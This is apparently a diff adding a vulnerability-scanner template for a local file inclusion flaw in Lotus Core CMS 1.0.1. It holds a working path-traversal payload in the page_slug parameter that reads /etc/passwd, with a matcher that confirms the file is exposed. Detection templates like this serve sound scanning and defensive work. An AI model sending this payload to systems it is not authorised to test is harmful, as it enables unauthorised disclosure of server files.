@@ -1,0 +1,19 @@
+id: lotus-core-cms-lfi
+info:
+  author: 0x_Akoko
+  name: Lotus Core CMS 1.0.1 - Local File Inclusion
+  reference: https://cxsecurity.com/issue/WLB-2020010234
+  severity: high
+  tags: lfi
+requests:
+- matchers:
+  - regex:
+    - root:[x*]:0:0
+    type: regex
+  - status:
+    - 200
+    type: status
+  matchers-condition: and
+  method: GET
+  path:
+  - '{{BaseURL}}/index.php?page_slug=../../../../../etc/passwd%00'
